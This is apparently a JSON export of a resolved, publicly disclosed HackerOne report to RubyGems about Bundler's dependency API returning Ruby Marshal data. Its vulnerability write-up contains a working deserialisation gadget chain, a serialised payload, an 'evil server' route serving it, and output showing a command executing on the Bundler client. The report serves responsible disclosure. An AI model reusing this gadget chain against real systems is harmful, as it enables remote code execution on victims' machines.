{
  "id": 1119120,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTE5MTIw",
  "url": "https://hackerone.com/reports/1119120",
  "title": "Bundler's RCE with response using Marshal",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2021-03-07T07:02:49.544Z",
  "submitted_at": "2021-03-07T07:02:49.576Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8212,
    "url": "https://hackerone.com/rubygems",
    "handle": "rubygems",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "RubyGems",
      "twitter_handle": "rubygems_status",
      "website": "https://rubygems.org",
      "about": "RubyGems.org is the Ruby community’s gem hosting service."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-03-12T02:56:05.631Z",
  "bug_reporter_agreed_on_going_public_at": "2024-02-11T02:56:05.479Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.\n\nhttps://github.com/rubygems/rubygems.org/blob/a6f78a01598592083850f15e262bbc09a85b0a70/app/controllers/api/v1/dependencies_controller.rb#L12\n\n```ruby\n    respond_to do |format|\n      format.json { render json: deps }\n      format.marshal { render plain: Marshal.dump(deps) }\n    end\n```\n\nAccording to the [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) article, Marshal.load can be RCE.\nTherefore, RCE is possible for the client that receives the specially crafted response.\n\n\n### Poc\n\n#### Prepare attack code\n\nPrepare code to run `date`\n\n```ruby\n# Universal Deserialisation Gadget for Ruby 2.x-3.x\n# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n\n# Autoload the required classes\nGem::SpecFetcher\nGem::Installer\n\n# prevent the payload from running when we Marshal.dump it\nmodule Gem\n  class Requirement\n    def marshal_dump\n      [@requirements]\n    end\n  end\nend\n\nwa1 = Net::WriteAdapter.new(Kernel, :system)\n\nrs = Gem::RequestSet.allocate\nrs.instance_variable_set('@sets', wa1)\nrs.instance_variable_set('@git_set', \"date\") # for run `date`\n\nwa2 = Net::WriteAdapter.new(rs, :resolve)\n\ni = Gem::Package::TarReader::Entry.allocate\ni.instance_variable_set('@read', 0)\ni.instance_variable_set('@header', \"aaa\")\n\n\nn = Net::BufferedIO.allocate\nn.instance_variable_set('@io', i)\nn.instance_variable_set('@debug_output', wa2)\n\nt = Gem::Package::TarReader.allocate\nt.instance_variable_set('@io', n)\n\nr = Gem::Requirement.allocate\nr.instance_variable_set('@requirements', t)\n\npayload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])\nputs payload.inspect\n```\n\n```\n❯ ruby create_rce.rb\n\"\\x04\\b[\\bc\\x15Gem::SpecFetcherc\\x13Gem::InstallerU:\\x15Gem::Requirement[\\x06o:\\x1CGem::Package::TarReader\\x06:\\b@ioo:\\x14Net::BufferedIO\\a;\\ao:#Gem::Package::TarReader::Entry\\a:\\n@readi\\x00:\\f@headerI\\\"\\baaa\\x06:\\x06ET:\\x12@debug_outputo:\\x16Net::WriteAdapter\\a:\\f@socketo:\\x14Gem::RequestSet\\a:\\n@setso;\\x0E\\a;\\x0Fm\\vKernel:\\x0F@method_id:\\vsystem:\\r@git_setI\\\"\\tdate\\x06;\\fT;\\x12:\\fresolve\"\n```\n\n#### Prepare evil server\n\nPrepare a server to work on the response.\nI created it based on [geminabox](https://github.com/geminabox/geminabox).\n\n```ruby\n# geminabox/geminabox/lib/geminabox/server.rb\n    get '/api/v1/dependencies' do\n      attack = \"\\x04\\b[\\bc\\x15Gem::SpecFetcherc\\x13Gem::InstallerU:\\x15Gem::Requirement[\\x06o:\\x1CGem::Package::TarReader\\x06:\\b@ioo:\\x14Net::BufferedIO\\a;\\ao:#Gem::Package::TarReader::Entry\\a:\\n@readi\\x00:\\f@headerI\\\"\\baaa\\x06:\\x06ET:\\x12@debug_outputo:\\x16Net::WriteAdapter\\a:\\f@socketo:\\x14Gem::RequestSet\\a:\\n@setso;\\x0E\\a;\\x0Fm\\vKernel:\\x0F@method_id:\\vsystem:\\r@git_setI\\\"\\tdate\\x06;\\fT;\\x12:\\fresolve\"\n      query_gems.any? ? attack : 200\n    end\n```\n\n```\n❯ RUBYGEMS_PROXY=true rackup\nPuma starting in single mode...\n* Puma version: 5.2.2 (ruby 2.7.1-p83) (\"Fettisdagsbulle\")\n*  Min threads: 0\n*  Max threads: 5\n*  Environment: development\n*          PID: 22469\n* Listening on http://127.0.0.1:9292\n* Listening on http://[::1]:9292\n```\n\n### Use evil sever\n\n```\n❯ bundle -v\nBundler version 2.2.13\n\n❯ bundle init\n\n# Use evil server for source\n❯ cat Gemfile\n# frozen_string_literal: true\n\n# source \"https://rubygems.org\"\nsource \"http://127.0.0.1:9292\"\n\ngem \"json\"\n```\n\n```\n# `date` runs on the client\n❯ bundle install\nFetching gem metadata from http://127.0.0.1:9292/.sh: reading: command not found\n2021年 3月 7日 日曜日 15時44分43秒 JST\n\nRetrying dependency api due to error (2/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String\nsh: reading: command not found\n2021年 3月 7日 日曜日 15時44分43秒 JST\n\nRetrying dependency api due to error (3/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String\nsh: reading: command not found\n2021年 3月 7日 日曜日 15時44分44秒 JST\n\nRetrying dependency api due to error (4/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String\nsh: reading: command not found\n2021年 3月 7日 日曜日 15時44分44秒 JST\n```\n\n## Impact\n\nOf course, there is a danger in specifying an untrusted `source` and in the possibility of a man-in-the-middle attack. This endpoint using marshal increases that risk.",
  "weakness": {
    "id": 52,
    "name": "Deserialization of Untrusted Data"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2024-03-12T02:56:05.543Z",
  "allow_singular_disclosure_after": -48183509.27624523,
  "singular_disclosure_allowed": true,
  "vote_count": 28,
  "voters": [
    "r_aj",
    "8910jq",
    "exec_iq",
    "zy9ard3",
    "cyborg_m",
    "neilx",
    "3x3_",
    "shivammusic",
    "muhammadidriss",
    "dgzn",
    "and 18 more..."
  ],
  "structured_scope": {
    "databaseId": 2043,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rubygems/rubygems",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
